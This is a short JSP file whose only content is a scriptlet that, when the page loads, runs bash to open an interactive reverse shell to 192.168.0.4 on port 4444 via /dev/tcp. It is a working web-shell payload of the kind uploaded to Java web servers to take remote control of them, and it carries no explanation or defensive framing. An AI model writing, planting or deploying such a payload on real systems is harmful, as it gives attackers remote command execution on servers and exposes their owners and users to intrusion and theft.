<% 
String host = "192.168.0.4";
String port = "4444"; 
Process p = Runtime.getRuntime().exec("bash -c 'bash -i >& /dev/tcp/" + host + "/" + port + " 0>&1'");
%>
